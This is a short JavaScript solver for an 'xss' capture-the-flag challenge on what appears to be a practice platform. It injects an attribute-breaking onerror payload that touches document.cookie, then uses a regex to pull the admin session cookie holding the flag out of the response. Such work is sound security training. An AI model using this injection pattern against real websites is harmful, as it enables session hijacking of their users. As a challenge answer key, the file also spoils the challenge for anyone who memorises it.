(function( challenge_id = "xss" ){

	runSolution( { challenge_id, solution } );
	
	async function solution( tag ){
		let image = `" onerror='document.cookie' "`,
		    res = await HackerChallenge.submitAnswer( "xss", [ image, "" ] ).catch( data => data.responseJSON ),
		    flag = res.hc_challenge.html.match( /admin_sess_id=(flag\{[^}]*})/ )[1];
		console.log( image );
		console.log( flag );
		tag.refs.image.value = image;
		tag.refs.answer.value = flag;
	}
})();
